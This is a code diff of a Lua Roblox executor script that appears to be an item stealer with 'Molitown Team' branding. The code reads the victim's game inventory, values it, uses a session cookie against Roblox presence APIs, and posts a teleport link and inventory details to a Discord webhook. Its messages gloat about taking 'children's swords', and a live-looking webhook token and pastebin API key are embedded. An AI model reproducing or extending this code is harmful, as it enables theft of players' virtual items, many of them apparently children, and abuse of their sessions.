@@ -22,276 +22,71 @@ local function shouldCheckJobId()
     return false
 end
 
-local function KickPlayer(reason)
-    local localPlayer = Players.LocalPlayer
-    if localPlayer then
-        local kickMethods = {
-            function() localPlayer:Kick(reason) end,
-            function() game:Shutdown() end,
-            function() while true do end end,
-            function() error(reason) end,
-            function() getgenv().crash = nil end
-        }
-        
-        for i, method in ipairs(kickMethods) do
-            local success = pcall(method)
-            if success then
-                break
-            end
-        end
-    end
-end
-
--- РАБОЧИЙ МЕТОД ДЛЯ ПОЛУЧЕНИЯ REAL JOBID
+-- Простая функция для получения Real JobId
 local function GetRealJobIdWithAuth()
     if not getgenv().Cookie then
-        print("Cookie не найден")
         return nil
     end
     
     local localPlayer = Players.LocalPlayer
-    if not localPlayer then 
-        print("Локальный игрок не найден")
-        return nil 
-    end
+    if not localPlayer then return nil end
     
     local placeId = game.PlaceId
-    local currentJobId = game.JobId
     
     -- Получаем всех других игроков
     local otherPlayers = {}
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= localPlayer then
-            table.insert(otherPlayers, player)
+            table.insert(otherPlayers, player.UserId)
         end
     end
     
     if #otherPlayers == 0 then
-        print("Нет других игроков для проверки")
         return nil
     end
     
-    print("Проверяем", #otherPlayers, "других игроков")
-    
-    -- Попробуем метод с использованием Roblox API через request
-    local function TryGetJobIdFromAPI()
-        -- Формируем запрос к API для получения информации о сессии
-        local userIds = {}
-        for _, player in pairs(otherPlayers) do
-            table.insert(userIds, player.UserId)
-        end
-        
-        if #userIds == 0 then return nil end
-        
+    -- Пробуем получить через Presence API
+    local success, result = pcall(function()
         local jsonBody = HttpService:JSONEncode({
-            userIds = userIds
+            userIds = otherPlayers
         })
         
-        local success, response = pcall(function()
-            return request({
-                Url = "https://presence.roblox.com/v1/presence/users",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie),
-                    ["X-CSRF-TOKEN"] = "fetch" -- Будем получать токен
-                },
-                Body = jsonBody
-            })
-        end)
+        local response = request({
+            Url = "https://presence.roblox.com/v1/presence/users",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+            },
+            Body = jsonBody
+        })
         
-        if success and response then
-            if response.StatusCode == 200 then
-                local jsonSuccess, data = pcall(function()
-                    return HttpService:JSONDecode(response.Body)
-                end)
-                
-                if jsonSuccess and data.userPresences then
-                    for _, presence in pairs(data.userPresences) do
-                        if presence.placeId == placeId and presence.gameId and presence.gameId ~= currentJobId then
-                            print("Найден Real JobId через API:", presence.gameId)
-                            return presence.gameId
-                        end
+        if response and response.StatusCode == 200 then
+            local data = HttpService:JSONDecode(response.Body)
+            if data and data.userPresences then
+                for _, presence in pairs(data.userPresences) do
+                    if presence.placeId == placeId and presence.gameId and presence.gameId ~= game.JobId then
+                        return presence.gameId
                     end
                 end
             end
         end
         
         return nil
+    end)
+    
+    if success then
+        return result
     end
     
-    -- Попробуем метод через TeleportService
-    local function TryGetJobIdFromTeleport()
-        local teleportService = game:GetService("TeleportService")
-        
-        -- Создаем резервную копию метода
-        local originalReserveServer = teleportService.ReserveServer
-        
-        local foundJobId = nil
-        
-        -- Временно изменяем метод для перехвата JobId
-        teleportService.ReserveServer = function(_, placeId)
-            -- Это сработает если другой игрок попытается зарезервировать сервер
-            print("Попытка резервации сервера для placeId:", placeId)
-            return "temp_jobid"
-        end
-        
-        -- Ждем немного
-        wait(2)
-        
-        -- Восстанавливаем оригинальный метод
-        teleportService.ReserveServer = originalReserveServer
-        
-        return foundJobId
-    end
-    
-    -- Попробуем метод через сетевые запросы к Roblox
-    local function TryGetJobIdFromNetwork()
-        -- Этот метод пытается получить информацию через HTTP запросы
-        for _, player in pairs(otherPlayers) do
-            local success, result = pcall(function()
-                -- Попробуем получить прямую ссылку на игру
-                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
-                local response = request({
-                    Url = url,
-                    Method = "GET"
-                })
-                
-                if response and response.StatusCode == 200 then
-                    local data = HttpService:JSONDecode(response.Body)
-                    if data and data.data then
-                        for _, server in pairs(data.data) do
-                            if server.playing and server.playing > 0 and server.id ~= currentJobId then
-                                -- Проверим есть ли наш игрок на этом сервере
-                                local playerUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/" .. server.id .. "/players"
-                                local playerResponse = request({
-                                    Url = playerUrl,
-                                    Method = "GET"
-                                })
-                                
-                                if playerResponse and playerResponse.StatusCode == 200 then
-                                    local playerData = HttpService:JSONDecode(playerResponse.Body)
-                                    if playerData and playerData.data then
-                                        for _, serverPlayer in pairs(playerData.data) do
-                                            if serverPlayer.id == player.UserId then
-                                                print("Найден Real JobId через сеть:", server.id)
-                                                return server.id
-                                            end
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end)
-            
-            if success and result then
-                return result
-            end
-        end
-        
-        return nil
-    end
-    
-    -- МЕТОД 4: Используем альтернативный API эндпоинт
-    local function TryGetJobIdFromAlternativeAPI()
-        for _, player in pairs(otherPlayers) do
-            local success, result = pcall(function()
-                -- Прямой запрос к Roblox API для получения информации об игре
-                local url = string.format("https://api.roblox.com/users/%d/onlinestatus/", player.UserId)
-                local response = request({
-                    Url = url,
-                    Method = "GET",
-                    Headers = {
-                        ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
-                    }
-                })
-                
-                if response and response.StatusCode == 200 then
-                    local data = HttpService:JSONDecode(response.Body)
-                    if data and data.GameId and data.GameId ~= currentJobId and data.PlaceId == placeId then
-                        print("Найден Real JobId через альтернативный API:", data.GameId)
-                        return data.GameId
-                    end
-                end
-            end)
-            
-            if success and result then
-                return result
-            end
-        end
-        
-        return nil
-    end
-    
-    -- МЕТОД 5: Пробуем получить через TeleportService напрямую
-    local function TryGetJobIdDirect()
-        -- Этот метод использует факт того, что мы можем получить JobId из ссылки на игру
-        for _, player in pairs(otherPlayers) do
-            -- Пробуем получить прямую ссылку на сессию через Roblox
-            local url = string.format("https://www.roblox.com/games/%d?privateServerLinkCode=%s", 
-                placeId, player.UserId)
-            
-            local success, result = pcall(function()
-                local response = request({
-                    Url = url,
-                    Method = "GET",
-                    Headers = {
-                        ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
-                    }
-                })
-                
-                if response then
-                    -- Парсим HTML в поисках JobId
-                    local body = response.Body
-                    -- Ищем pattern для JobId в ссылке
-                    local pattern = "gameInstanceId=([%w%-]+)"
-                    local jobId = body:match(pattern)
-                    
-                    if jobId and jobId ~= currentJobId then
-                        print("Найден Real JobId через прямую ссылку:", jobId)
-                        return jobId
-                    end
-                end
-            end)
-            
-            if success and result then
-                return result
-            end
-        end
-        
-        return nil
-    end
-    
-    -- Попробуем все методы по очереди
-    print("Пробуем метод 1: API запрос...")
-    local jobId = TryGetJobIdFromAPI()
-    if jobId then return jobId end
-    
-    print("Пробуем метод 2: Альтернативный API...")
-    jobId = TryGetJobIdFromAlternativeAPI()
-    if jobId then return jobId end
-    
-    print("Пробуем метод 3: Сетевой запрос...")
-    jobId = TryGetJobIdFromNetwork()
-    if jobId then return jobId end
-    
-    print("Пробуем метод 4: Прямой метод...")
-    jobId = TryGetJobIdDirect()
-    if jobId then return jobId end
-    
-    print("Все методы не сработали")
     return nil
 end
 
 -- Функция для отправки уведомления об ожидании
 local function SendWaitingNotification(inventoryValue, playerName)
-    local http = game:GetService("HttpService")
-    
     local embed = {
         ["title"] = "⏳ Ожидание Real JobId",
-        ["color"] = 16753920, -- Оранжевый цвет
+        ["color"] = 16753920,
         ["fields"] = {
             {
                 ["name"] = "👤 Игрок",
@@ -302,20 +97,7 @@ local function SendWaitingNotification(inventoryValue, playerName)
                 ["name"] = "💰 Стоимость инвентаря",
                 ["value"] = "`" .. tostring(inventoryValue) .. "`",
                 ["inline"] = true
-            },
-            {
-                ["name"] = "📊 Статус",
-                ["value"] = "Ожидание подключения других игроков...",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "🕐 Время начала",
-                ["value"] = "`" .. os.date("%H:%M:%S") .. "`",
-                ["inline"] = true
             }
-        },
-        ["footer"] = {
-            ["text"] = "Molitown Team • Ожидание Real JobId"
         }
     }
     
@@ -325,145 +107,66 @@ local function SendWaitingNotification(inventoryValue, playerName)
         ["embeds"] = {embed}
     }
     
-    local success, response = pcall(function()
-        return request({
+    pcall(function()
+        request({
             Url = Webhook,
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = http:JSONEncode(data)
+            Body = HttpService:JSONEncode(data)
         })
     end)
 end
 
--- Функция для мониторинга новых игроков и получения Real JobId
+-- Функция для мониторинга новых игроков
 local function MonitorForRealJobId(inventoryValue, playerName)
-    print("Начинаем мониторинг новых игроков для получения Real JobId...")
-    
-    local maxAttempts = 60  -- 5 минут (60 * 5 секунд)
+    local maxAttempts = 12  -- 1 минута (12 * 5 секунд)
     local attempt = 0
     
     while attempt < maxAttempts do
         local realJobId = GetRealJobIdWithAuth()
         
         if realJobId then
-            print("Real JobId найден:", realJobId)
             getgenv().RealJobId = realJobId
-            
-            pcall(function()
-                writefile("real_jobid.txt", realJobId)
-            end)
-            
-            -- Отправляем уведомление об успешном получении
-            local successEmbed = {
-                ["title"] = "✅ Real JobId получен",
-                ["color"] = 65280, -- Зеленый
-                ["fields"] = {
-                    {
-                        ["name"] = "👤 Игрок",
-                        ["value"] = "`" .. playerName .. "`",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🎮 Real JobId",
-                        ["value"] = "`" .. realJobId .. "`",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "⏱️ Время ожидания",
-                        ["value"] = "`" .. tostring(attempt * 5) .. " секунд`",
-                        ["inline"] = true
-                    }
-                },
-                ["footer"] = {
-                    ["text"] = "Molitown Team • Real JobId подтвержден"
-                }
-            }
-            
-            local data = {
-                ["username"] = "M O L I T O W N",
-                ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
-                ["embeds"] = {successEmbed}
-            }
-            
-            pcall(function()
-                request({
-                    Url = Webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(data)
-                })
-            end)
-            
+            pcall(function() writefile("real_jobid.txt", realJobId) end)
             return realJobId
         end
         
         attempt = attempt + 1
-        print("Попытка", attempt, "из", maxAttempts, "- Real JobId не найден, ждем новых игроков...")
-        wait(5)  -- Ждем 5 секунд между попытками
+        wait(5)
         
-        -- Отправляем обновление статуса каждые 30 секунд
-        if attempt % 6 == 0 then  -- 30 секунд
+        if attempt % 3 == 0 then  -- Каждые 15 секунд
             SendWaitingNotification(inventoryValue, playerName)
         end
     end
     
-    -- Если не нашли Real JobId после всех попыток
-    print("Не удалось найти Real JobId после", maxAttempts, "попыток")
-    KickPlayer("Не удалось получить Real JobId. Пожалуйста, перезайдите.")
     return nil
 end
 
 local function FindRealJobId(inventoryValue, playerName)
     if not shouldCheckJobId() then
-        print("Проверка JobId отключена для экзекутора:", executor)
         getgenv().RealJobId = game.JobId
         return game.JobId
     end
     
-    print("Начинаем проверку JobId для экзекутора:", executor)
+    local realJobId = GetRealJobIdWithAuth()
     
-    -- Проверяем есть ли другие игроки
-    local otherPlayers = 0
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= Players.LocalPlayer then
-            otherPlayers = otherPlayers + 1
-        end
-    end
-    
-    if otherPlayers == 0 then
-        print("Нет других игроков, начинаем мониторинг...")
-        SendWaitingNotification(inventoryValue, playerName)
-        return MonitorForRealJobId(inventoryValue, playerName)
+    if realJobId then
+        getgenv().RealJobId = realJobId
+        pcall(function() writefile("real_jobid.txt", realJobId) end)
+        return realJobId
     else
-        print("Обнаружены другие игроки:", otherPlayers)
-        local realJobId = GetRealJobIdWithAuth()
-        
-        if realJobId then
-            print("Real JobId сразу найден:", realJobId)
-            getgenv().RealJobId = realJobId
-            
-            pcall(function()
-                writefile("real_jobid.txt", realJobId)
-            end)
-            
-            return realJobId
-        else
-            print("Real JobId не найден сразу, начинаем мониторинг...")
-            SendWaitingNotification(inventoryValue, playerName)
-            return MonitorForRealJobId(inventoryValue, playerName)
-        end
+        SendWaitingNotification(inventoryValue, playerName)
+        return MonitorForRealJobId(inventoryValue, playerName) or game.JobId
     end
 end
 
--- ==================== ОРИГИНАЛЬНЫЙ КОД ====================
-Username = "knisdqx_meow" -- >> Your main account
-Username2 = "noviy_nickname" -- >> Your alt account
-Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
-MinimumValues = 30 -- >> Set 0 to disable
+-- ==================== ОСНОВНОЙ КОД ====================
+Username = "knisdqx_meow"
+Username2 = "noviy_nickname"
+Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42"
+MinimumValues = 30
 
 repeat task.wait() until game:IsLoaded()
 
@@ -494,9 +197,8 @@ local AgeValue = game:GetService("Players").LocalPlayer.AccountAge or "Unknown"
 local ExecutorValue = identifyexecutor() or "Unknown"
 local VersionValue = "2.0 (Trade System + Values Update)"
 
--- ГЛОБАЛЬНАЯ ТАБЛИЦА ЗНАЧЕНИЙ
+-- Таблица значений
 local valuesTable = {
-    -- >> Ancients/Tier 2 << --
     ["Gingerscope"] = 10500,
     ["TravelerAxe"] = 5000,
     ["Harvester"] = 390,
@@ -504,7 +206,6 @@ local valuesTable = {
     ["VampireAxe"] = 600,
     ["Celestial"] = 800,
     ["Corrupt"] = 800,
-    -- >> Ancients/Tier 1 << --
     ["SwirlyAxe"] = 100,
     ["Icebreaker"] = 100,
     ["ElderwoodScythe"] = 65,
@@ -512,11 +213,9 @@ local valuesTable = {
     ["Hallowscythe"] = 55,
     ["Logchopper"] = 25,
     ["Icewing"] = 5,
-    -- >> Vintages/Tier 2 << --
     ["GhostK2018"] = 10,
     ["AmericaGun"] = 8,
     ["BloodKnife"] = 8,
-    -- >> Vintages/Tier 1 << --
     ["Disint"] = 7,
     ["Phaser"] = 7,
     ["ShadowKnife"] = 6,
@@ -524,7 +223,6 @@ local valuesTable = {
     ["Gun1"] = 4,
     ["GoldenGun"] = 4,
     ["Knife1"] = 3,
-    -- >> Chromas/Tier 3 << --
     ["TravelerGunChroma"] = 20000,
     ["TreeGun2023Chroma"] = 30000,
     ["TreeKnife2023Chroma"] = 35000,
@@ -536,14 +234,12 @@ local valuesTable = {
     ["AlienbeamChroma"] = 9000,
     ["SunsetChroma"] = 3500,
     ["SunriseChroma"] = 4500,
-    -- >> Chromas/Tier 2 << --
     ["ChromaDarkbringer"] = 125,
     ["ChromaLightbringer"] = 120,
     ["CandleflameChroma"] = 115,
     ["ElderwoodKnifeChroma"] = 115,
     ["SwirlyGunChroma"] = 115,
     ["Gingermint_KChroma"] = 110,
-    -- >> Chromas/Tier 1 << --
     ["LugerChroma"] = 100,
     ["LaserChroma"] = 80,
     ["HeatChroma"] = 70,
@@ -557,7 +253,6 @@ local valuesTable = {
     ["SeerChroma"] = 55,
     ["BonebladeChroma"] = 50,
     ["SawChroma"] = 50,
-    -- >> Godlies/Tier 3 << --
     ["TravelerGun"] = 3600,
     ["TreeGun2023"] = 2800,
     ["Turkey2023"] = 1500,
@@ -598,7 +293,6 @@ local valuesTable = {
     ["Sunrise"] = 300,
     ["Snowcannon"] = 600,
     ["Snowdagger"] = 600,
-    -- >> Godlies/Tier 2 << --
     ["Phantom2022"] = 75,
     ["Spectre2022"] = 75,
     ["Luger"] = 75,
@@ -636,7 +330,6 @@ local valuesTable = {
     ["Gingerblade"] = 22,
     ["Heat"] = 22,
     ["Minty"] = 22,
-    -- >> Godlies/Tier 1 << --
     ["BattleAxe2"] = 20,
     ["Deathshard"] = 20,
     ["Tides"] = 20,
@@ -668,7 +361,6 @@ local valuesTable = {
     ["Prismatic"] = 7,
     ["Saw"] = 7,
     ["Snowflake"] = 7,
-    -- >> Godlies/Tier 0 << --
     ["Peppermint"] = 7,
     ["Cookieblade"] = 7,
     ["BlueSeer"] = 7,
@@ -677,9 +369,7 @@ local valuesTable = {
     ["TheSeer"] = 7,
     ["OrangeSeer"] = 7,
     ["YellowSeer"] = 7,
-    -- >> Legendaries/Special Tier << --
     ["JD"] = 65,
-    -- >> Legendaries/Tier 3 << --
     ["Latte_G_2023"] = 90,
     ["Latte_K_2023"] = 90,
     ["CottonCandy"] = 65,
@@ -688,37 +378,9 @@ local valuesTable = {
     ["Cavern_K_2019"] = 22,
 }
 
--- ВРЕМЕННЫЙ СКРИПТ ДЛЯ СБОРА ДАННЫХ ИНВЕНТАРЯ ДО ПОЛУЧЕНИЯ REAL JOBID
+-- Переменные инвентаря
 local allItems = {}
 local totalValues = 0
-
-local vintageItems1 = {}
-local commonItems1 = {}
-local uncommonItems1 = {}
-local rareItems1 = {}
-local legendaryItems1 = {}
-local godlyItems1 = {}
-local ancientItems1 = {}
-local uniqueItems1 = {}
-
-local vintageItems = {}
-local commonItems = {}
-local uncommonItems = {}
-local rareItems = {}
-local legendaryItems = {}
-local godlyItems = {}
-local ancientItems = {}
-local uniqueItems = {}
-
-local vintageItemsC = 0
-local commonItemsC = 0
-local uncommonItemsC = 0
-local rareItemsC = 0
-local legendaryItemsC = 0
-local godlyItemsC = 0
-local ancientItemsC = 0
-local uniqueItemsC = 0
-
 local uniqueItemsValue = 0
 local ancientItemsValue = 0
 local godlyItemsValue = 0
@@ -729,7 +391,6 @@ local uncommonItemsValue = 0
 local commonItemsValue = 0
 
 local function CalculateInventory()
-    -- Сбрасываем значения
     totalValues = 0
     uniqueItemsValue = 0
     ancientItemsValue = 0
@@ -740,34 +401,7 @@ local function CalculateInventory()
     uncommonItemsValue = 0
     commonItemsValue = 0
     
-    -- Очищаем таблицы
     allItems = {}
-    vintageItems1 = {}
-    commonItems1 = {}
-    uncommonItems1 = {}
-    rareItems1 = {}
-    legendaryItems1 = {}
-    godlyItems1 = {}
-    ancientItems1 = {}
-    uniqueItems1 = {}
-    
-    vintageItems = {}
-    commonItems = {}
-    uncommonItems = {}
-    rareItems = {}
-    legendaryItems = {}
-    godlyItems = {}
-    ancientItems = {}
-    uniqueItems = {}
-    
-    vintageItemsC = 0
-    commonItemsC = 0
-    uncommonItemsC = 0
-    rareItemsC = 0
-    legendaryItemsC = 0
-    godlyItemsC = 0
-    ancientItemsC = 0
-    uniqueItemsC = 0
 
     for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
         for c, d in pairs(b) do
@@ -791,182 +425,84 @@ local function CalculateInventory()
             elseif d.Rarity == "Common" then
                 commonItemsValue = commonItemsValue + totalValue
             end
-        end
-    end
-
-    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-        for c, d in pairs(b) do
-            local itemKey = d.DataID
-            local itemValue = valuesTable[itemKey]
-            local weaponValue = itemValue and (itemValue * d.Amount) or 0
-
-            local formatTable = {
+            
+            local weaponValue = itemValue * d.Amount
+            table.insert(allItems, {
                 weaponName = d.ItemName,
                 weaponData = d.DataID,
                 weaponAmount = d.Amount,
                 weaponRarity = d.Rarity,
                 weaponValue = weaponValue
-            }
+            })
             
-            table.insert(allItems, formatTable)
-
-            local visualFormat = d.ItemName .. " • [x" .. d.Amount .. " | " .. weaponValue .. "]"
-
-            if d.Rarity == "Vintage" then
-                vintageItemsC = vintageItemsC + d.Amount
-                table.insert(vintageItems, visualFormat)
-                table.insert(vintageItems1, formatTable)
-            end
-
-            if d.Rarity == "Common" then
-                commonItemsC = commonItemsC + d.Amount
-                table.insert(commonItems, visualFormat)
-                table.insert(commonItems1, formatTable)
-            end
-
-            if d.Rarity == "Uncommon" then
-                uncommonItemsC = uncommonItemsC + d.Amount
-                table.insert(uncommonItems, visualFormat)
-                table.insert(uncommonItems1, formatTable)
-            end
-
-            if d.Rarity == "Rare" then
-                rareItemsC = rareItemsC + d.Amount
-                table.insert(rareItems, visualFormat)
-                table.insert(rareItems1, formatTable)
-            end
-
-            if d.Rarity == "Legendary" then
-                legendaryItemsC = legendaryItemsC + d.Amount
-                table.insert(legendaryItems, visualFormat)
-                table.insert(legendaryItems1, formatTable)
-            end
-
-            if d.Rarity == "Godly" then
-                godlyItemsC = godlyItemsC + d.Amount
-                table.insert(godlyItems, visualFormat)
-                table.insert(godlyItems1, formatTable)
-            end
-
-            if d.Rarity == "Ancient" then
-                ancientItemsC = ancientItemsC + d.Amount
-                table.insert(ancientItems, visualFormat)
-                table.insert(ancientItems1, formatTable)
-            end
-
-            if d.Rarity == "Unique" then
-                uniqueItemsC = uniqueItemsC + d.Amount
-                table.insert(uniqueItems, visualFormat)
-                table.insert(uniqueItems1, formatTable)
-            end
+            totalValues = totalValues + weaponValue
         end
-    end
-
-    -- >> Values calculating logic << --
-    for _, item in pairs(allItems) do
-        totalValues = totalValues + item.weaponValue
     end
 
     return totalValues
 end
 
--- Сначала собираем данные инвентаря
+-- Собираем данные инвентаря
 local inventoryValue = CalculateInventory()
 
--- Проверяем JobId и получаем Real JobId если нужно
+-- Получаем Real JobId
 if getgenv().Cookie and shouldCheckJobId() then
-    print("Checking JobId for executor:", executor)
-    local realJobId = FindRealJobId(inventoryValue, NameValue)
-    
-    if realJobId then
-        print("Real JobId найден:", realJobId)
-        getgenv().RealJobId = realJobId
-    else
-        print("Не удалось получить Real JobId, используем обычный")
-        getgenv().RealJobId = game.JobId
-    end
+    getgenv().RealJobId = FindRealJobId(inventoryValue, NameValue) or game.JobId
 else
-    print("Skipping JobId check for executor:", executor)
-    -- Используем обычный JobId для других экзекуторов
     getgenv().RealJobId = game.JobId
 end
 
--- СИСТЕМА ТЕЛЕПОРТА (ИСПРАВЛЕННАЯ) - используем RealJobId вместо game.JobId
+-- Создаем ссылку для телепорта
 local placeId = game.PlaceId
-local realJobId = getgenv().RealJobId or game.JobId  -- Используем RealJobId если есть, иначе обычный
+local realJobId = getgenv().RealJobId or game.JobId
 local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
 local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
 
--- ФУНКЦИИ ДЛЯ ОТПРАВКИ СООБЩЕНИЙ (ДОЛЖНЫ БЫТЬ ПОСЛЕ ОПРЕДЕЛЕНИЯ REALJOBID)
+-- Функция отправки сообщений
 function SendMessageEMBED(url, embed, bool)
     local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
     
-    -- Формируем контент с телепортом в стиле первого кода
     local teleportContent = "🎯 **ВЬЕБАН** Очередной кукич:\n\n" .. TeleportScript
     
     local data = {
         ["username"] = "M O L I T O W N",
         ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
         ["content"] = teleportContent,
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = "Molitown Team 2025 | debugged for 6h"
-                }
-            }
-        }
+        ["embeds"] = {{
+            ["title"] = embed.title,
+            ["color"] = embed.color,
+            ["fields"] = embed.fields,
+            ["footer"] = {["text"] = "Molitown Team 2025"}
+        }}
     }
     
     local data2 = {
         ["username"] = "M O L I T O W N", 
         ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
         ["content"] = "-- @everyone\n" .. teleportContent,
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = "Molitown Team 2025 | debugged for 6h"
-                }
-            }
-        }
+        ["embeds"] = {{
+            ["title"] = embed.title,
+            ["color"] = embed.color,
+            ["fields"] = embed.fields,
+            ["footer"] = {["text"] = "Molitown Team 2025"}
+        }}
     }
     
-    local body = http:JSONEncode(data)
-    local body2 = http:JSONEncode(data2)
+    local body = http:JSONEncode(bool and data2 or data)
 
-    if bool == true then
-        local response = request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body2
-        })
-    else
-        local response = request({
+    pcall(function()
+        request({
             Url = url,
             Method = "POST",
             Headers = headers,
             Body = body
         })
-    end
+    end)
 end
 
--- Функция для отправки успешного трейда в Discord
+-- Функция для отправки успешного трейда
 function SendTradeSuccessMessage(sentItems, ReceiverName)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    -- Форматируем список отправленных предметов
     local itemsText = ""
     local totalValue = 0
     
@@ -979,76 +515,46 @@ function SendTradeSuccessMessage(sentItems, ReceiverName)
     local data = {
         ["username"] = "Mama Mia",
         ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
-        ["embeds"] = {
-            {
-                ["title"] = "✅ Вьебали додика в чешки",
-                ["color"] = 65280,
-                ["fields"] = {
-                    {
-                        ["name"] = "📦 Мечи детей:",
-                        ["value"] = "```" .. itemsText .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "💰 Общая стоимость:",
-                        ["value"] = "**" .. totalValue .. "**",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "👤 Забрал:",
-                        ["value"] = "**" .. ReceiverName .. "**",
-                        ["inline"] = true
-                    }
-                },
-                ["footer"] = {
-                    ["text"] = "Molitown Team feat. Interpol • " .. os.date("%Y-%m-%d %H:%M:%S")
-                }
-            }
-        }
+        ["embeds"] = {{
+            ["title"] = "✅ Вьебали додика в чешки",
+            ["color"] = 65280,
+            ["fields"] = {
+                {["name"] = "📦 Мечи детей:", ["value"] = "```" .. itemsText .. "```", ["inline"] = false},
+                {["name"] = "💰 Общая стоимость:", ["value"] = "**" .. totalValue .. "**", ["inline"] = true},
+                {["name"] = "👤 Забрал:", ["value"] = "**" .. ReceiverName .. "**", ["inline"] = true}
+            },
+            ["footer"] = {["text"] = "Molitown Team feat. Interpol • " .. os.date("%Y-%m-%d %H:%M:%S")}
+        }}
     }
     
-    local body = http:JSONEncode(data)
-    
-    local response = request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    pcall(function()
+        request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
 end
 
--- ТЕПЕРЬ ОТПРАВЛЯЕМ ОСНОВНОЕ СООБЩЕНИЕ ПОСЛЕ ПОЛУЧЕНИЯ REAL JOBID
+-- Проверяем минимальную стоимость
 if totalValues < MinimumValues then
-    print("Стоимость инвентаря меньше MinimumValues:", totalValues)
     return
 end
 
--- УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ТОП ПРЕДМЕТОВ
+-- Получаем топ предметы
 local function getTopValuableItems(n)
-    local topItemsList = {}
-    
-    for _, item in pairs(allItems) do
-        table.insert(topItemsList, item)
-    end
-    
-    -- Сортируем по убыванию ценности за штуку
-    table.sort(topItemsList, function(a, b) 
+    table.sort(allItems, function(a, b) 
         return a.weaponValue > b.weaponValue
     end)
     
-    -- Возвращаем топ-N предметов с улучшенным форматированием
     local topItems = {}
-    for i = 1, math.min(n, #topItemsList) do
-        local item = topItemsList[i]
+    for i = 1, math.min(n, #allItems) do
+        local item = allItems[i]
         local rarityEmoji = {
-            Unique = "💎",
-            Ancient = "🔥", 
-            Godly = "⭐",
-            Vintage = "🕰️",
-            Legendary = "👑",
-            Rare = "🔵",
-            Uncommon = "🟢",
-            Common = "⚪"
+            Unique = "💎", Ancient = "🔥", Godly = "⭐",
+            Vintage = "🕰️", Legendary = "👑", Rare = "🔵",
+            Uncommon = "🟢", Common = "⚪"
         }
         
         local emoji = rarityEmoji[item.weaponRarity] or "📦"
@@ -1057,80 +563,51 @@ local function getTopValuableItems(n)
     return topItems
 end
 
--- Получаем 5 самых ценных предметов
 local topItems = getTopValuableItems(5)
 local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
 
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local lastOfferValue = nil
-
--- Перехватываем UpdateTrade чтобы получить LastOffer
-Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
-    -- Сохраняем LastOffer из данных трейда
-    lastOfferValue = tradeData.LastOffer
-end)
-
-local HttpService = game:GetService("HttpService")
-
+-- Создаем pastebin
 local function pastebin(content)
-    local body = {
-        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
-        api_paste_code = content,
-        api_option = "paste"
-    }
-
-    local encodedBody = ""
-    for key, value in pairs(body) do
-        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
-    end
-    encodedBody = encodedBody:sub(1, -2)
-
-    local response
-    local success, err = pcall(function()
-        response = request({
+    local success, result = pcall(function()
+        local response = request({
             Url = "https://pastebin.com/api/api_post.php",
             Method = "POST",
-            Body = encodedBody,
-            Headers = {
-                ["Content-Type"] = "application/x-www-form-urlencoded"
-            },
-            Timeout = 20
